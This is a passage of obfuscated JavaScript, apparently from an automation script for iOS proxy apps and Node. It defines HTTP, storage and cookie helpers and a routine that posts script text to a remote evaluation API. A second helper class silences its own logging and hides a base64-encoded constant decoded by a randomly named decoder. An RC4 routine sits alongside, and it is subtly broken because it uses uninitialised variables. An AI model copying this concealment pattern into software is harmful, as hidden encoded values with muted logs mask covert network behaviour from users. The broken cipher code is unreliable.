      this.logs = this.logs.concat(B);
    }
    log(...S) {
      S.length > 0 && (this.logs = [...this.logs, ...S]);
      console.log(S.join(this.logSeparator));
    }
    logErr(S, a) {
      const Y = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      Y ? this.log("", "❗️" + this.name + ", 错误!", S.stack) : this.log("", "❗️" + this.name + ", 错误!", S);
    }
    wait(S) {
      return new Promise(Y => setTimeout(Y, S));
    }
    done(S = {}) {
      const a = new Date().getTime(),
        Y = (a - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + Y + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(S);
    }
  }(T, c);
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (c) {
    var S = "";
    var a, Y, j, Z, Q, B, b;
    var U = 0;
    c = _utf8_encode(c);
    while (U < c.length) {
      a = c.charCodeAt(U++);
      Y = c.charCodeAt(U++);
      j = c.charCodeAt(U++);
      Z = a >> 2;
      Q = (a & 3) << 4 | Y >> 4;
      B = (Y & 15) << 2 | j >> 6;
      b = j & 63;
      isNaN(Y) ? B = b = 64 : isNaN(j) && (b = 64);
      S = S + _keyStr.charAt(Z) + _keyStr.charAt(Q) + _keyStr.charAt(B) + _keyStr.charAt(b);
    }
    return S;
  };
  this.decode = function (c) {
    var a = "";
    var B, b, U;
    var Y, j, Z, Q;
    var S = 0;
    c = c.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (S < c.length) {
      Y = _keyStr.indexOf(c.charAt(S++));
      j = _keyStr.indexOf(c.charAt(S++));
      Z = _keyStr.indexOf(c.charAt(S++));
      Q = _keyStr.indexOf(c.charAt(S++));
      B = Y << 2 | j >> 4;
      b = (j & 15) << 4 | Z >> 2;
      U = (Z & 3) << 6 | Q;
      a = a + String.fromCharCode(B);
      Z != 64 && (a = a + String.fromCharCode(b));
      Q != 64 && (a = a + String.fromCharCode(U));
    }
    a = _utf8_decode(a);
    return a;
  };
  _utf8_encode = function (c) {
    c = c.replace(/\r\n/g, "\n");
    var C = "";
    for (var S = 0; S < c.length; S++) {
      var a = c.charCodeAt(S);
      a < 128 ? C += String.fromCharCode(a) : a > 127 && a < 2048 ? (C += String.fromCharCode(a >> 6 | 192), C += String.fromCharCode(a & 63 | 128)) : (C += String.fromCharCode(a >> 12 | 224), C += String.fromCharCode(a >> 6 & 63 | 128), C += String.fromCharCode(a & 63 | 128));
    }
    return C;
  };
  _utf8_decode = function (c) {
    c1 = c2 = 0;
    var C = "",
      S = 0,
      a = c1;
    while (S < c.length) {
      a = c.charCodeAt(S);
      a < 128 ? (C += String.fromCharCode(a), S++) : a > 191 && a < 224 ? (c2 = c.charCodeAt(S + 1), C += String.fromCharCode((a & 31) << 6 | c2 & 63), S += 2) : (c2 = c.charCodeAt(S + 1), c3 = c.charCodeAt(S + 2), C += String.fromCharCode((a & 15) << 12 | (c2 & 63) << 6 | c3 & 63), S += 3);
    }
    return C;
  };
}
function rc4(T, c) {
  var C = Array(256),
    S = Array(T.length);
  for (var a = 0; a < 256; a++) {
    C[a] = a;
    var Y = (Y + C[a] + c.charCodeAt(a % c.length)) % 256,
      j = C[a];
    C[a] = C[Y];
    C[Y] = j;
  }
  for (var a = 0; a < T.length; a++) {
    S[a] = T.charCodeAt(a);
  }
  for (var Z = 0; Z < S.length; Z++) {
    var a = (a + 1) % 256,
      Y = (Y + C[a]) % 256,
      j = C[a];
    C[a] = C[Y];
    C[Y] = j;
    var Q = (C[a] + C[Y] % 256) % 256;
    S[Z] = String.fromCharCode(S[Z] ^ C[Q]);
  }
  return S.join("");
}
function Envcc(T, c) {
  class C {
    constructor(S) {
      this.env = S;
    }
    send(S, a = "GET") {
      S = "string" == typeof S ? {
        url: S
      } : S;
      let j = this.get;
      "POST" === a && (j = this.post);
      return new Promise((Z, Q) => {
        j.call(this, S, (b, U, q) => {
          b ? Q(b) : Z(U);
        });
      });
    }
    get(S) {
      return this.send.call(this.env, S);
    }
    post(S) {
      return this.send.call(this.env, S, "POST");
    }
  }
  return new class {
    constructor(S, a) {
      this.name = S;
      this.http = new C(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = false;
      this.isNeedRewrite = false;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, a);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(S, a = null) {
      try {
        return JSON.parse(S);
      } catch {
        return a;
      }
    }
    toStr(S, a = null) {
      try {
        return JSON.stringify(S);
      } catch {
        return a;
      }
    }
    getjson(S, a) {
      let j = a;
      const Z = this.getdata(S);
      if (Z) {
        try {
          j = JSON.parse(this.getdata(S));
        } catch {}
      }
      return j;
    }
    setjson(S, a) {
      try {
        return this.setdata(JSON.stringify(S), a);
      } catch {
        return false;
      }
    }
    getScript(S) {
      return new Promise(a => {
        const Y = {
          url: S
        };
        this.get(Y, (j, Z, Q) => a(Q));
      });
    }
    runScript(S, a) {
      return new Promise(j => {
        let Z = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        Z = Z ? Z.replace(/\n/g, "").trim() : Z;
        let Q = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        Q = Q ? 1 * Q : 20;
        Q = a && a.timeout ? a.timeout : Q;
        const [B, b] = Z.split("@"),
          U = {
            url: "http://" + b + "/v1/scripting/evaluate",
            body: {
              script_text: S,
              mock_type: "cron",
              timeout: Q
            },
            headers: {
              "X-Key": B,
              Accept: "*/*"
            }
          };
        this.post(U, (q, i, J) => j(J));
      }).catch(j => this.logErr(j));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const S = this.path.resolve(this.dataFile),
          a = this.path.resolve(process.cwd(), this.dataFile),
          Y = this.fs.existsSync(S),
          j = !Y && this.fs.existsSync(a);
        if (!Y && !j) {
          return {};
        }
        {
          const Z = Y ? S : a;
          try {
            return JSON.parse(this.fs.readFileSync(Z));
          } catch (Q) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const a = this.path.resolve(this.dataFile),
          Y = this.path.resolve(process.cwd(), this.dataFile),
          j = this.fs.existsSync(a),
          Z = !j && this.fs.existsSync(Y),
          Q = JSON.stringify(this.data);
        j ? this.fs.writeFileSync(a, Q) : Z ? this.fs.writeFileSync(Y, Q) : this.fs.writeFileSync(a, Q);
      }
    }
    lodash_get(S, a, Y) {
      const j = a.replace(/\[(\d+)\]/g, ".$1").split(".");
      let Z = S;
      for (const Q of j) if (Z = Object(Z)[Q], void 0 === Z) {
        return Y;
      }
      return Z;
    }
    lodash_set(S, a, Y) {
      return Object(S) !== S ? S : (Array.isArray(a) || (a = a.toString().match(/[^.[\]]+/g) || []), a.slice(0, -1).reduce((Q, B, b) => Object(Q[B]) === Q[B] ? Q[B] : Q[B] = Math.abs(a[b + 1]) >> 0 == +a[b + 1] ? [] : {}, S)[a[a.length - 1]] = Y, S);
    }
    getdata(S) {
      let a = this.getval(S);
      if (/^@/.test(S)) {
        const [, Y, j] = /^@(.*?)\.(.*?)$/.exec(S),
          Z = Y ? this.getval(Y) : "";
        if (Z) {
          try {
            const Q = JSON.parse(Z);
            a = Q ? this.lodash_get(Q, j, "") : a;
          } catch (B) {
            a = "";
          }
        }
      }
      return a;
    }
    setdata(S, a) {
      let Z = false;
      if (/^@/.test(a)) {
        const [, Q, B] = /^@(.*?)\.(.*?)$/.exec(a),
          b = this.getval(Q),
          U = Q ? "null" === b ? null : b || "{}" : "{}";
        try {
          const q = JSON.parse(U);
          this.lodash_set(q, B, S);
          Z = this.setval(JSON.stringify(q), Q);
        } catch (J) {
          const V = {};
          this.lodash_set(V, B, S);
          Z = this.setval(JSON.stringify(V), Q);
        }
      } else {
        Z = this.setval(S, a);
      }
      return Z;
    }
    getval(S) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(S) : this.isQuanX() ? $prefs.valueForKey(S) : this.isNode() ? (this.data = this.loaddata(), this.data[S]) : this.data && this.data[S] || null;
    }
    setval(S, a) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(S, a) : this.isQuanX() ? $prefs.setValueForKey(S, a) : this.isNode() ? (this.data = this.loaddata(), this.data[a] = S, this.writedata(), true) : this.data && this.data[a] || null;
    }
    initGotEnv(S) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      S && (S.headers = S.headers ? S.headers : {}, void 0 === S.headers.Cookie && void 0 === S.cookieJar && (S.cookieJar = this.ckjar));
    }
    get(S, a = () => {}) {
      if (S.headers && (delete S.headers["Content-Type"], delete S.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        const j = {
          "X-Surge-Skip-Scripting": false
        };
        this.isSurge() && this.isNeedRewrite && (S.headers = S.headers || {}, Object.assign(S.headers, j));
        $httpClient.get(S, (Z, Q, B) => {
          !Z && Q && (Q.body = B, Q.statusCode = Q.status);
          a(Z, Q, B);
        });
      } else {
        if (this.isQuanX()) {
          const Q = {
            hints: false
          };
          this.isNeedRewrite && (S.opts = S.opts || {}, Object.assign(S.opts, Q));
          $task.fetch(S).then(B => {
            const {
                statusCode: b,
                statusCode: U,
                headers: q,
                body: i
              } = B,
              J = {
                status: b,
                statusCode: U,
                headers: q,
                body: i
              };
            a(null, J, i);
          }, B => a(B));
        } else {
          if (this.isNode()) {
            let B = require("iconv-lite");
            this.initGotEnv(S);
            this.got(S).on("redirect", (b, U) => {
              try {
                if (b.headers["set-cookie"]) {
                  const J = b.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  J && this.ckjar.setCookieSync(J, null);
                  U.cookieJar = this.ckjar;
                }
              } catch (V) {
                this.logErr(V);
              }
            }).then(b => {
              const {
                  statusCode: U,
                  statusCode: q,
                  headers: i,
                  rawBody: J
                } = b,
                I = {
                  status: U,
                  statusCode: q,
                  headers: i,
                  rawBody: J
                };
              a(null, I, B.decode(J, this.encoding));
            }, b => {
              const {
                message: U,
                response: q
              } = b;
              a(U, q, q && B.decode(q.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(S, a = () => {}) {
      const j = S.method ? S.method.toLocaleLowerCase() : "post";
      if (S.body && S.headers && !S.headers["Content-Type"] && (S.headers["Content-Type"] = "application/x-www-form-urlencoded"), S.headers && delete S.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        const Z = {
          "X-Surge-Skip-Scripting": false
        };
        this.isSurge() && this.isNeedRewrite && (S.headers = S.headers || {}, Object.assign(S.headers, Z));
        $httpClient[j](S, (Q, B, b) => {
          !Q && B && (B.body = b, B.statusCode = B.status);
          a(Q, B, b);
        });
      } else {
        if (this.isQuanX()) {
          S.method = j;
          const Q = {
            hints: false
          };
          this.isNeedRewrite && (S.opts = S.opts || {}, Object.assign(S.opts, Q));
          $task.fetch(S).then(B => {
            const {
                statusCode: b,
                statusCode: U,
                headers: q,
                body: i
              } = B,
              J = {
                status: b,
                statusCode: U,
                headers: q,
                body: i
              };
            a(null, J, i);
          }, B => a(B));
        } else {
          if (this.isNode()) {
            let U = require("iconv-lite");
            this.initGotEnv(S);
            const {
              url: q,
              ...i
            } = S;
            this.got[j](q, i).then(J => {
              const {
                  statusCode: I,
                  statusCode: V,
                  headers: E,
                  rawBody: W
                } = J,
                O = {
                  status: I,
                  statusCode: V,
                  headers: E,
                  rawBody: W
                };
              a(null, O, U.decode(W, this.encoding));
            }, J => {
              const {
                message: V,
                response: E
              } = J;
              a(V, E, E && U.decode(E.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(S, a = null) {
      const j = a ? new Date(a) : new Date();
      let Z = {
        "M+": j.getMonth() + 1,
        "d+": j.getDate(),
        "H+": j.getHours(),
        "m+": j.getMinutes(),
        "s+": j.getSeconds(),
        "q+": Math.floor((j.getMonth() + 3) / 3),
        S: j.getMilliseconds()
      };
      /(y+)/.test(S) && (S = S.replace(RegExp.$1, (j.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let Q in Z) new RegExp("(" + Q + ")").test(S) && (S = S.replace(RegExp.$1, 1 == RegExp.$1.length ? Z[Q] : ("00" + Z[Q]).substr(("" + Z[Q]).length)));
      return S;
    }
    msg(S = T, a = "", Y = "", j) {
      const Q = B => {
        if (!B) {
          return B;
        }
        if ("string" == typeof B) {
          return this.isLoon() ? B : this.isQuanX() ? {
            "open-url": B
          } : this.isSurge() ? {
            url: B
          } : void 0;
        }
        if ("object" == typeof B) {
          if (this.isLoon()) {
            let U = B.openUrl || B.url || B["open-url"],
              q = B.mediaUrl || B["media-url"];
            const i = {
              openUrl: U,
              mediaUrl: q
            };
            return i;
          }
          if (this.isQuanX()) {
            let J = B["open-url"] || B.url || B.openUrl,
              I = B["media-url"] || B.mediaUrl;
            const V = {
              "open-url": J,
              "media-url": I
            };
            return V;
          }
          if (this.isSurge()) {
            let E = B.url || B.openUrl || B["open-url"];
            const W = {
              url: E
            };
            return W;
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(S, a, Y, Q(j)) : this.isQuanX() && $notify(S, a, Y, Q(j))), !this.isMuteLog) {
        let B = ["", "==============📣系统通知📣=============="];
        B.push(S);
        a && B.push(a);
        Y && B.push(Y);
        console.log(B.join("\n"));
        this.logs = this.logs.concat(B);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...S) {}
    logErr(S, a) {
      const Y = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      Y ? this.log("", "❗️" + this.name + ", 错误!", S.stack) : this.log("", "❗️" + this.name + ", 错误!", S);
    }
    fwur() {
      var S = new FxPCnMKLw7();
      return S.decode(this.fwcaas());
    }
    wait(S) {
      return new Promise(a => setTimeout(a, S));
    }
    done(S = {}) {
      const a = new Date().getTime(),
        Y = (a - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + Y + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(S);
    }
  }(T, c);
}